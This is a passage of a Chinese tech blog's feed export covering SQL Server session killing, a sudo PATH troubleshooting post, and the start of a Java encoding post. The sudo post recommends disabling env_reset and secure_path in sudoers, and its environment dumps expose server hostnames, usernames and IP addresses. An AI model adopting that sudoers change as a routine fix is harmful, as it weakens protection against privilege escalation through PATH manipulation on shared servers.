src="/2018/10/09/sqlserver-slow-killer/image-20181009091326051.png"><p>结果中展示了session的<code>pid</code>以及正在执行的命令，消耗的cpu时间以及总的耗费时间，如果需要杀掉这个session，可以用下面的命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kill</span> &lt;pid&gt;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://docs.microsoft.com/en-us/sql/t-sql/language-elements/kill-transact-sql?view=sql-server-2017" rel="external nofollow noopener noreferrer" target="_blank">KILL (Transact-SQL) | Microsoft Docs</a></li><li><a href="https://gist.github.com/alexsorokoletov/a079629f9e1435c7f81f" rel="external nofollow noopener noreferrer" target="_blank">Helpful functions when you need to find out what is going on on SQL Server</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;SQL&quot;&gt;&lt;a href=&quot;#SQL&quot; class=&quot;headerlink&quot; title=&quot;SQL&quot;&gt;&lt;/a&gt;SQL&lt;/h1&gt;&lt;p&gt;查询慢查询的信息：&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;
      
    
    </summary>
    
      <category term="db" scheme="http://qsli.github.io/categories/db/"/>
    
    
      <category term="sqlserver-killer" scheme="http://qsli.github.io/tags/sqlserver-killer/"/>
    
  </entry>
  
  <entry>
    <title>sudo命令的环境路径</title>
    <link href="http://qsli.github.io/2018/10/07/sudo-path/"/>
    <id>http://qsli.github.io/2018/10/07/sudo-path/</id>
    <published>2018-10-07T13:27:58.000Z</published>
    <updated>2018-10-08T16:46:00.838Z</updated>
    
    <content type="html"><![CDATA[<p>运行sudo命令时，有时会提示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo -u tomcat jstack 123</span><br><span class="line">sudo: jstack: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure><p>但是查看<code>/etc/profile</code>可以看到:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/<span class="built_in">local</span>/jdk/default</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$JAVA_HOME</span>/lib/dt.jar:<span class="variable">$JAVA_HOME</span>/lib/tools.jar</span><br></pre></td></tr></table></figure><p>确实导出了环境变量，那么为什么运行的时候不成功呢？</p><p>换成如下的命令，可以找到:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo -i  -u tomcat jstack 123</span><br><span class="line">123: No such process</span><br></pre></td></tr></table></figure><p>这次成功的找到了命令，区别在哪儿？</p><p>可以通过下面的命令查看环境变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo -i -u tomcat env</span><br><span class="line">HOSTNAME=yd_app_api_02</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">TERM=xterm-256color</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">USER=tomcat</span><br><span class="line">LS_COLORS=rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:<span class="keyword">do</span>=38;5;5:bd=48;5;232;38;5;11:<span class="built_in">cd</span>=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:</span><br><span class="line">SUDO_USER=qisheng.li</span><br><span class="line">SUDO_UID=1024</span><br><span class="line">USERNAME=tomcat</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/jdk/default/bin:/sbin:/bin:/usr/sbin:/usr/bin:/usr/<span class="built_in">local</span>/sbin:/home/tomcat/.<span class="built_in">local</span>/bin:/home/tomcat/bin</span><br><span class="line">MAIL=/var/spool/mail/tomcat</span><br><span class="line">PWD=/home/tomcat</span><br><span class="line">JAVA_HOME=/usr/<span class="built_in">local</span>/jdk/default</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">HISTCONTROL=ignoredups</span><br><span class="line">SHLVL=1</span><br><span class="line">SUDO_COMMAND=/bin/bash -c env</span><br><span class="line">HOME=/home/tomcat</span><br><span class="line">LOGNAME=tomcat</span><br><span class="line">CLASSPATH=.:/usr/<span class="built_in">local</span>/jdk/default/lib/dt.jar:/usr/<span class="built_in">local</span>/jdk/default/lib/tools.jar</span><br><span class="line">LESSOPEN=||/usr/bin/lesspipe.sh %s</span><br><span class="line">SUDO_GID=1024</span><br><span class="line">_=/bin/env</span><br></pre></td></tr></table></figure><p>可以看到<code>PATH</code>中包含了<code>/usr/local/jdk/default/bin</code>，这个是jdk的<code>bin</code>目录，所以<code>jstack</code>命令可以找到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo  -u tomcat env</span><br><span class="line">HOSTNAME=yd_app_api_02</span><br><span class="line">TERM=xterm-256color</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">LS_COLORS=rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:<span class="keyword">do</span>=38;5;5:bd=48;5;232;38;5;11:<span class="built_in">cd</span>=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:</span><br><span class="line">MAIL=/var/spool/mail/qisheng.li</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">PATH=/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">LOGNAME=tomcat</span><br><span class="line">USER=tomcat</span><br><span class="line">USERNAME=tomcat</span><br><span class="line">HOME=/home/tomcat</span><br><span class="line">SUDO_COMMAND=/bin/env</span><br><span class="line">SUDO_USER=qisheng.li</span><br><span class="line">SUDO_UID=1024</span><br><span class="line">SUDO_GID=1024</span><br></pre></td></tr></table></figure><p>没有<code>-i</code>的环境变量就没有<code>JDK</code>的路径。</p><p>看下<code>sudo</code>的man：</p><blockquote><p>-i [command]<br>​                The -i (simulate initial login) option runs the shell specified by the password database entry of the target user as a login shell.  This means that<br>​                login-specific resource files such as .profile or .login will be read by the shell.  If a command is specified, it is passed to the shell for execution<br>​                via the shell’s -c option.  If no command is specified, an interactive shell is executed.  sudo attempts to change to that user’s home directory before<br>​                running the shell.  The security policy shall initialize the environment to a minimal set of variables, similar to what is present when a user logs in.<br>​                The Command Environment section in the sudoers(5) manual documents how the -i option affects the environment in which a command is run when the sudoers<br>​                policy is in use.</p></blockquote><p><code>/etc/profile</code>的配置确实是全局的配置，但是这个只有在<code>login shell</code>的时候才会去<code>source</code>，才会生效。</p><p>关于集中类型的shell，可以查阅最后的参考链接，这里简单列出下：</p><img src="/2018/10/07/sudo-path/BashStartupFiles1-8918135.png"><ul><li><strong>login</strong> shell: A login shell logs you into the system as a spiecified user, necessary for this is a username and password. When you hit ctrl+alt+F1 to login into a virtual terminal you get after successful login: a login shell (that is interactive). Sourced files:<ul><li><code>/etc/profile</code> and <code>~/.profile</code> for Bourne compatible shells (and <code>/etc/profile.d/*</code>)</li><li><code>~/.bash_profile</code> for bash</li><li><code>/etc/zprofile</code> and <code>~/.zprofile</code> for zsh</li><li><code>/etc/csh.login</code> and <code>~/.login</code> for csh</li></ul></li><li><strong>non-login</strong> shell: A shell that is executed without logging in, necessary for this is a current logged in user. When you open a graphic terminal in gnome it is a non-login (interactive) shell. Sourced files:<ul><li><code>/etc/bashrc</code> and <code>~/.bashrc</code> for bash</li></ul></li><li><strong>interactive</strong> shell: A shell (login or non-login) where you can interactively type or interrupt commands. For example a gnome terminal (non-login) or a virtual terminal (login). In an interactive shell the prompt variable must be set (<code>$PS1</code>). Sourced files:<ul><li><code>/etc/profile</code> and <code>~/.profile</code></li><li><code>/etc/bashrc</code> or <code>/etc/bash.bashrc</code> for bash</li></ul></li><li><strong>non-interactive</strong> shell: A (sub)shell that is probably run from an automated process you will see neither input nor outputm when the calling process don’t handle it. That shell is normally a non-login shell, because the calling user has logged in already. A shell running a script is always a non-interactive shell, but the script can emulate an interactive shell by prompting the user to input values. Sourced files:<ul><li><code>/etc/bashrc</code> or <code>/etc/bash.bashrc</code> for bash (but, mostly you see this at the beginning of the script: <code>[ -z &quot;$PS1&quot; ] &amp;&amp; return</code>. That means don’t do anything if it’s a non-interactive shell)</li><li>depending on shell; some of them read the file in the <code>$ENV</code> variable</li></ul></li></ul><h4 id="用sudo-i就好了？"><a href="#用sudo-i就好了？" class="headerlink" title="用sudo -i就好了？"></a>用<code>sudo -i</code>就好了？</h4><p>用<code>sudo -i</code>的问题是当前目录被更改了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo -i -u tomcat env | grep PWD --color</span><br><span class="line">PWD=/home/tomcat</span><br></pre></td></tr></table></figure><p>不注意的话就掉坑里了，明明当前目录有脚本却执行不了。</p><h4 id="更好的解决办法"><a href="#更好的解决办法" class="headerlink" title="更好的解决办法"></a>更好的解决办法</h4><p>执行sudo命令时，<code>PATH</code>之所以会改变，起始是一种安全策略，防止用户的路径污染sudo的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">secure_path   Path used for every command run from sudo.  If you don&apos;t</span><br><span class="line">               trust the people running sudo to have a sane PATH environ‐</span><br><span class="line">               ment variable you may want to use this.  Another use is if</span><br><span class="line">               you want to have the “root path” be separate from the “user</span><br><span class="line">               path”.  Users in the group specified by the exempt_group</span><br><span class="line">               option are not affected by secure_path.  This option is not</span><br><span class="line">               set by default.</span><br></pre></td></tr></table></figure><p>看下我们线上机器的配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_02 ~]$ sudo visudo</span><br><span class="line"></span><br><span class="line">Defaults    env_reset</span><br><span class="line">Defaults    env_keep =  <span class="string">"COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Adding HOME to env_keep may enable a user to run unrestricted</span></span><br><span class="line"><span class="comment"># commands via sudo.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Defaults   env_keep += "HOME"</span></span><br><span class="line"></span><br><span class="line">Defaults    secure_path = /sbin:/bin:/usr/sbin:/usr/bin</span><br></pre></td></tr></table></figure><p><code>secure_path = /sbin:/bin:/usr/sbin:/usr/bin</code>只设置了这些路径， 和我们在上面看到的输出一致。<code>JDK</code>的bin目录没有加入查找路径，所以找不到命令也就不奇怪了。</p><p>当然<code>env_keep</code>可以保留一些环境变量到sudo命令的环境中，但是无法保留<code>PATH</code>，做如下修改，就可以不重置环境变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">######## 第一处修改，这里取反，表示不重置环境变量</span></span><br><span class="line">Defaults    !env_reset</span><br><span class="line">Defaults    env_keep =  <span class="string">"COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span></span><br><span class="line">Defaults    env_keep += <span class="string">"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Adding HOME to env_keep may enable a user to run unrestricted</span></span><br><span class="line"><span class="comment"># commands via sudo.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Defaults   env_keep += "HOME"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">######## 第二处修改</span></span><br><span class="line"><span class="comment">#Defaults    secure_path = /sbin:/bin:/usr/sbin:/usr/bin</span></span><br></pre></td></tr></table></figure><p>修改之后我们看看对应的环境变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[qisheng.li@yd_app_api_01 ~]$ sudo -u tomcat env</span><br><span class="line">XDG_SESSION_ID=111674</span><br><span class="line">HOSTNAME=yd_app_api_01</span><br><span class="line">TERM=xterm-256color</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">HISTSIZE=1000</span><br><span class="line">SSH_CLIENT=47.97.217.12 35698 22</span><br><span class="line">SSH_TTY=/dev/pts/5</span><br><span class="line">USER=tomcat</span><br><span class="line">LS_COLORS=rs=0:di=38;5;27:ln=38;5;51:mh=44;38;5;15:pi=40;38;5;11:so=38;5;13:<span class="keyword">do</span>=38;5;5:bd=48;5;232;38;5;11:<span class="built_in">cd</span>=48;5;232;38;5;3:or=48;5;232;38;5;9:mi=05;48;5;232;38;5;15:su=48;5;196;38;5;15:sg=48;5;11;38;5;16:ca=48;5;196;38;5;226:tw=48;5;10;38;5;16:ow=48;5;10;38;5;21:st=48;5;21;38;5;15:ex=38;5;34:*.tar=38;5;9:*.tgz=38;5;9:*.arc=38;5;9:*.arj=38;5;9:*.taz=38;5;9:*.lha=38;5;9:*.lz4=38;5;9:*.lzh=38;5;9:*.lzma=38;5;9:*.tlz=38;5;9:*.txz=38;5;9:*.tzo=38;5;9:*.t7z=38;5;9:*.zip=38;5;9:*.z=38;5;9:*.Z=38;5;9:*.dz=38;5;9:*.gz=38;5;9:*.lrz=38;5;9:*.lz=38;5;9:*.lzo=38;5;9:*.xz=38;5;9:*.bz2=38;5;9:*.bz=38;5;9:*.tbz=38;5;9:*.tbz2=38;5;9:*.tz=38;5;9:*.deb=38;5;9:*.rpm=38;5;9:*.jar=38;5;9:*.war=38;5;9:*.ear=38;5;9:*.sar=38;5;9:*.rar=38;5;9:*.alz=38;5;9:*.ace=38;5;9:*.zoo=38;5;9:*.cpio=38;5;9:*.7z=38;5;9:*.rz=38;5;9:*.cab=38;5;9:*.jpg=38;5;13:*.jpeg=38;5;13:*.gif=38;5;13:*.bmp=38;5;13:*.pbm=38;5;13:*.pgm=38;5;13:*.ppm=38;5;13:*.tga=38;5;13:*.xbm=38;5;13:*.xpm=38;5;13:*.tif=38;5;13:*.tiff=38;5;13:*.png=38;5;13:*.svg=38;5;13:*.svgz=38;5;13:*.mng=38;5;13:*.pcx=38;5;13:*.mov=38;5;13:*.mpg=38;5;13:*.mpeg=38;5;13:*.m2v=38;5;13:*.mkv=38;5;13:*.webm=38;5;13:*.ogm=38;5;13:*.mp4=38;5;13:*.m4v=38;5;13:*.mp4v=38;5;13:*.vob=38;5;13:*.qt=38;5;13:*.nuv=38;5;13:*.wmv=38;5;13:*.asf=38;5;13:*.rm=38;5;13:*.rmvb=38;5;13:*.flc=38;5;13:*.avi=38;5;13:*.fli=38;5;13:*.flv=38;5;13:*.gl=38;5;13:*.dl=38;5;13:*.xcf=38;5;13:*.xwd=38;5;13:*.yuv=38;5;13:*.cgm=38;5;13:*.emf=38;5;13:*.axv=38;5;13:*.anx=38;5;13:*.ogv=38;5;13:*.ogx=38;5;13:*.aac=38;5;45:*.au=38;5;45:*.flac=38;5;45:*.mid=38;5;45:*.midi=38;5;45:*.mka=38;5;45:*.mp3=38;5;45:*.mpc=38;5;45:*.ogg=38;5;45:*.ra=38;5;45:*.wav=38;5;45:*.axa=38;5;45:*.oga=38;5;45:*.spx=38;5;45:*.xspf=38;5;45:</span><br><span class="line">MAIL=/var/spool/mail/qisheng.li</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/jdk/default/bin:/usr/<span class="built_in">local</span>/bin:/usr/bin:/usr/<span class="built_in">local</span>/sbin:/usr/sbin:/home/qisheng.li/.<span class="built_in">local</span>/bin:/home/qisheng.li/bin</span><br><span class="line">PWD=/home/qisheng.li</span><br><span class="line">JAVA_HOME=/usr/<span class="built_in">local</span>/jdk/default</span><br><span class="line">LANG=en_US.UTF-8</span><br><span class="line">HISTCONTROL=ignoredups</span><br><span class="line">SHLVL=1</span><br><span class="line">HOME=/home/tomcat</span><br><span class="line">LOGNAME=tomcat</span><br><span class="line">CLASSPATH=.:/usr/<span class="built_in">local</span>/jdk/default/lib/dt.jar:/usr/<span class="built_in">local</span>/jdk/default/lib/tools.jar</span><br><span class="line">SSH_CONNECTION=47.97.217.12 35698 192.168.2.11 22</span><br><span class="line">LESSOPEN=||/usr/bin/lesspipe.sh %s</span><br><span class="line">XDG_RUNTIME_DIR=/run/user/1025</span><br><span class="line">_=/usr/bin/sudo</span><br><span class="line">USERNAME=tomcat</span><br><span class="line">SUDO_COMMAND=/usr/bin/env</span><br><span class="line">SUDO_USER=qisheng.li</span><br><span class="line">SUDO_UID=1025</span><br><span class="line">SUDO_GID=1025</span><br></pre></td></tr></table></figure><p>可以看到<code>JAVA_HOME</code>和<code>PATH</code>都有了，这个和<code>qisheng.li</code>的环境变量是一致的，限于篇幅，这里就不贴出来了。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="http://feihu.me/blog/2014/env-problem-when-ssh-executing-command-on-remote/" rel="external nofollow noopener noreferrer" target="_blank">ssh连接远程主机执行脚本的环境变量问题</a></li><li><a href="https://unix.stackexchange.com/questions/170493/login-non-login-and-interactive-non-interactive-shells" rel="external nofollow noopener noreferrer" target="_blank">bash - login/non-login and interactive/non-interactive shells - Unix &amp; Linux Stack Exchange</a></li><li><a href="https://unix.stackexchange.com/questions/332948/how-does-lookup-in-path-work-under-the-hood" rel="external nofollow noopener noreferrer" target="_blank">shell - How does lookup in $PATH work under the hood? - Unix &amp; Linux Stack Exchange</a></li><li><a href="https://superuser.com/questions/927512/how-to-set-path-for-sudo-commands" rel="external nofollow noopener noreferrer" target="_blank">linux - How to set path for sudo commands - Super User</a></li><li><a href="http://perlchina.github.io/advent.perlchina.org/2009/SSHBatch.html" rel="external nofollow noopener noreferrer" target="_blank">http://perlchina.github.io/advent.perlchina.org/2009/SSHBatch.html</a>)</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;运行sudo命令时，有时会提示：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;
      
    
    </summary>
    
      <category term="linux" scheme="http://qsli.github.io/categories/linux/"/>
    
    
      <category term="sudo" scheme="http://qsli.github.io/tags/sudo/"/>
    
  </entry>
  
  <entry>
    <title>java中encoding总结</title>
    <link href="http://qsli.github.io/2018/08/12/java-encoding/"/>
    <id>http://qsli.github.io/2018/08/12/java-encoding/</id>
    <published>2018-08-12T15:18:44.000Z</published>
    <updated>2018-08-12T15:18:44.127Z</updated>
    
    <content type="html"><![CDATA[<h1 id="URLConnection-乱码"><a href="#URLConnection-乱码" class="headerlink" title="URLConnection 乱码"></a>URLConnection 乱码</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URL realUrl = <span class="keyword">new</span> URL(<span class="string">""</span>urlNameString<span class="string">""</span>);</span><br><span class="line">URLConnection connection = realUrl.openConnection();</span><br><span class="line">OutputStreamWriter out = <span class="keyword">new</span> OutputStreamWriter(connection  </span><br><span class="line">        .getOutputStream(), <span class="string">"UTF-8"</span>);</span><br></pre></td></tr></table></figure><p>在获取<code>OutputStreamWriter</code>需要指定编码格式， 否则使用的是默认的编码， 查看<code>OutputStreamWriter</code>的没有指定编码的构造函数:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creates an OutputStreamWriter that uses the default character encoding.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span>  out  An OutputStream</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">OutputStreamWriter</span><span class="params">(OutputStream out)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(out);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        se = StreamEncoder.forOutputStreamWriter(out, <span class="keyword">this</span>, (String)<span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) 